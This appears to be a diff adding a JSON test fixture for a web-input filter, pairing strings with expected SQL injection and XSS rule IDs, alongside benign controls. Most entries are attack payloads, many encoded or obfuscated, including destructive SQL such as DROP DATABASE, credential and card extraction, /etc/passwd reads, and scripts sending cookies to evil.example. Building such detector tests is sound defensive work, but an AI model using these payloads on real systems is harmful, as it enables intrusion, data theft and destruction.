@@ -1,0 +1,775 @@
+[
+ {
+  "value": "' OR '1'='1",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "1 UNION SELECT username, password FROM users --",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "<script>alert(1)</script>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<img src=x onerror=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "javascript:alert(document.cookie)",
+  "rules": [
+   "XSS-005",
+   "XSS-009"
+  ]
+ },
+ {
+  "value": "%2527%2520OR%25201%253D1%2520--",
+  "rules": [
+   "SQLI-003",
+   "SQLI-004"
+  ]
+ },
+ {
+  "value": "1 UN/**/ION SEL/**/ECT 1,2",
+  "rules": [
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "&#60;img src=x onerror=alert(1)&#62;",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "JyBPUiAnMSc9JzE=",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "java\tscript:alert(1)",
+  "rules": [
+   "XSS-005"
+  ]
+ },
+ {
+  "value": "\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1ealert(1)",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<scr\u200bipt>alert(1)</script>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "\\u003cscript\\u003ealert(1)",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "%u003Cscript%u003E",
+  "rules": [
+   "XSS-001",
+   "XSS-002"
+  ]
+ },
+ {
+  "value": "O'Brien",
+  "rules": []
+ },
+ {
+  "value": "Please select a size",
+  "rules": []
+ },
+ {
+  "value": "I <3 this shop",
+  "rules": []
+ },
+ {
+  "value": "Is 1=1 always true?",
+  "rules": []
+ },
+ {
+  "value": "delete from cart",
+  "rules": []
+ },
+ {
+  "value": "blue shirt",
+  "rules": []
+ },
+ {
+  "value": "hello+world",
+  "rules": []
+ },
+ {
+  "value": "100%25 cotton",
+  "rules": []
+ },
+ {
+  "value": "%E2%9C%93 done",
+  "rules": []
+ },
+ {
+  "value": "%ZZbad",
+  "rules": []
+ },
+ {
+  "value": "a&amp;b&lt;c",
+  "rules": []
+ },
+ {
+  "value": "&lt;svg onload=alert(1)&gt;",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "%4A%79%42%50%55%69%41%6E%4D%53%63%39%4A%7A%45%3D",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "JyBPUiAnMSc9JzE%3D",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "aGVsbG8gd29ybGQgdGhpcyBpcyBmaW5l",
+  "rules": []
+ },
+ {
+  "value": "x' OR 'a'='a",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "1' or '1'='1' -- -",
+  "rules": [
+   "SQLI-003",
+   "SQLI-005"
+  ]
+ },
+ {
+  "value": "\" or \"\"=\"",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "') OR ('x'='x",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "1 or 2=2",
+  "rules": [
+   "SQLI-004"
+  ]
+ },
+ {
+  "value": "admin' #",
+  "rules": [
+   "SQLI-005"
+  ]
+ },
+ {
+  "value": "' UNION SELECT NULL--",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "0 UNION SELECT table_name FROM information_schema.tables",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002",
+   "SQLI-009"
+  ]
+ },
+ {
+  "value": "-1 UNION ALL SELECT 1,@@version,3",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002",
+   "SQLI-012"
+  ]
+ },
+ {
+  "value": "1' UNION SELECT card, cvv FROM payments-- ",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "1; UPDATE users SET role='admin' WHERE id=1",
+  "rules": [
+   "SQLI-006",
+   "SQLI-007"
+  ]
+ },
+ {
+  "value": "2; DROP DATABASE shop",
+  "rules": [
+   "SQLI-006",
+   "SQLI-007"
+  ]
+ },
+ {
+  "value": "'; TRUNCATE TABLE logs; --",
+  "rules": [
+   "SQLI-006",
+   "SQLI-007"
+  ]
+ },
+ {
+  "value": "1'; INSERT INTO users VALUES ('x','y'); --",
+  "rules": [
+   "SQLI-005",
+   "SQLI-006",
+   "SQLI-007"
+  ]
+ },
+ {
+  "value": "1 AND BENCHMARK(5000000,MD5(1))",
+  "rules": [
+   "SQLI-008"
+  ]
+ },
+ {
+  "value": "1); SELECT pg_sleep(10)--",
+  "rules": [
+   "SQLI-008"
+  ]
+ },
+ {
+  "value": "' AND SLEEP(3) AND '1'='1",
+  "rules": [
+   "SQLI-003",
+   "SQLI-008"
+  ]
+ },
+ {
+  "value": "1' WAITFOR DELAY '0:0:10'--",
+  "rules": [
+   "SQLI-005",
+   "SQLI-008"
+  ]
+ },
+ {
+  "value": "1 AND 1=CONVERT(int,(SELECT @@version))",
+  "rules": [
+   "SQLI-012"
+  ]
+ },
+ {
+  "value": "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
+  "rules": [
+   "SQLI-011",
+   "SQLI-015"
+  ]
+ },
+ {
+  "value": "' OR EXISTS(SELECT * FROM users)--",
+  "rules": [
+   "SQLI-013"
+  ]
+ },
+ {
+  "value": "1 GROUP BY 5--",
+  "rules": [
+   "SQLI-014"
+  ]
+ },
+ {
+  "value": "1' ORDER BY 3#",
+  "rules": [
+   "SQLI-014"
+  ]
+ },
+ {
+  "value": "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
+  "rules": [
+   "SQLI-009",
+   "SQLI-013"
+  ]
+ },
+ {
+  "value": "'; COPY users TO PROGRAM 'id'; --",
+  "rules": [
+   "SQLI-005",
+   "SQLI-010"
+  ]
+ },
+ {
+  "value": "1 AND LOAD_FILE('/etc/passwd')",
+  "rules": [
+   "SQLI-010"
+  ]
+ },
+ {
+  "value": "' INTO OUTFILE '/tmp/x.php'--",
+  "rules": [
+   "SQLI-005",
+   "SQLI-010"
+  ]
+ },
+ {
+  "value": "' HAVING 1=1--",
+  "rules": []
+ },
+ {
+  "value": "1 RLIKE (SELECT 1)",
+  "rules": []
+ },
+ {
+  "value": "1 AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>64",
+  "rules": [
+   "SQLI-013"
+  ]
+ },
+ {
+  "value": "<script>fetch('//evil.example/'+document.cookie)</script>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-009"
+  ]
+ },
+ {
+  "value": "<script src=https://evil.example/a.js></script>",
+  "rules": [
+   "XSS-001",
+   "XSS-002"
+  ]
+ },
+ {
+  "value": "<img src=1 onerror=confirm(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<IMG SRC=x onError=prompt(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<svg/onload=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<body onpageshow=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<input autofocus onfocus=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<select onfocus=alert(1) autofocus>",
+  "rules": [
+   "XSS-003",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<video><source onerror=alert(1)></video>",
+  "rules": [
+   "XSS-003",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<audio src=x onerror=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<details ontoggle=alert(1) open>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<marquee onstart=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<div onmouseover=alert(1)>x</div>",
+  "rules": [
+   "XSS-003",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<a href=javascript:alert(1)>x</a>",
+  "rules": [
+   "XSS-005"
+  ]
+ },
+ {
+  "value": "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-006",
+   "XSS-007",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<iframe src=//evil.example></iframe>",
+  "rules": [
+   "XSS-007"
+  ]
+ },
+ {
+  "value": "<object data=javascript:alert(1)>",
+  "rules": [
+   "XSS-005",
+   "XSS-006",
+   "XSS-007"
+  ]
+ },
+ {
+  "value": "<embed src=//evil.example/x.swf>",
+  "rules": [
+   "XSS-007"
+  ]
+ },
+ {
+  "value": "\"><script>alert(1)</script>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "'><img src=x onerror=alert(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "\" autofocus onfocus=alert(1) x=\"",
+  "rules": [
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "javascript:void(document.cookie)",
+  "rules": [
+   "XSS-005",
+   "XSS-009"
+  ]
+ },
+ {
+  "value": "<svg><script>alert(1)</script></svg>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-008",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<math><mtext></mtext><script>alert(1)</script></math>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<form action=javascript:alert(1)><button>x</button></form>",
+  "rules": [
+   "XSS-005",
+   "XSS-006"
+  ]
+ },
+ {
+  "value": "<link rel=stylesheet href=javascript:alert(1)>",
+  "rules": [
+   "XSS-005",
+   "XSS-006"
+  ]
+ },
+ {
+  "value": "<base href=//evil.example/>",
+  "rules": []
+ },
+ {
+  "value": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+  "rules": [
+   "XSS-005"
+  ]
+ },
+ {
+  "value": "<style>@import 'https://evil.example/x.css';</style>",
+  "rules": [
+   "XSS-011"
+  ]
+ },
+ {
+  "value": "<x onclick=alert(1)>click</x>",
+  "rules": [
+   "XSS-003",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "${alert(1)}",
+  "rules": []
+ },
+ {
+  "value": "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-005",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "%27%20OR%20%271%27%3D%271",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "%2527%2520UNION%2520SELECT%25201%252C2--",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "%25253Cscript%25253Ealert%2525281%252529%25253C/script%25253E",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "%3Csvg%20onload%3Dalert(1)%3E",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "1 uNiOn/*x*/sElEcT 1,2",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "1/*!50000UNION*//*!50000SELECT*/1,2",
+  "rules": []
+ },
+ {
+  "value": "1 UNION/**/ALL/**/SELECT/**/1",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "1%0aUNION%0aSELECT%0a1",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "1%09or%091=1",
+  "rules": [
+   "SQLI-004"
+  ]
+ },
+ {
+  "value": "'/**/OR/**/'1'='1",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "'||'1'='1",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "' OR 1=1%00",
+  "rules": [
+   "SQLI-003",
+   "SQLI-004"
+  ]
+ },
+ {
+  "value": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "&lt;img src=x onerror=alert(1)&gt;",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "\\u003csvg onload=alert(1)\\u003e",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<scr\tipt>alert(1)</scr\tipt>",
+  "rules": [
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "<img src=x o\nnerror=alert(1)>",
+  "rules": [
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "jav\u200bascript:alert(1)",
+  "rules": [
+   "XSS-005"
+  ]
+ },
+ {
+  "value": "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "J1VOSU9OIFNFTEVDVCAxLDIgLS0=",
+  "rules": [
+   "SQLI-001",
+   "SQLI-002"
+  ]
+ },
+ {
+  "value": "1' oR 0x31=0x31--",
+  "rules": [
+   "SQLI-003"
+  ]
+ },
+ {
+  "value": "1 || 1=1",
+  "rules": []
+ },
+ {
+  "value": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+  "rules": [
+   "XSS-003",
+   "XSS-006",
+   "XSS-010"
+  ]
+ },
+ {
+  "value": "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
+  "rules": [
+   "XSS-001",
+   "XSS-002",
+   "XSS-010"
+  ]
+ }
+]
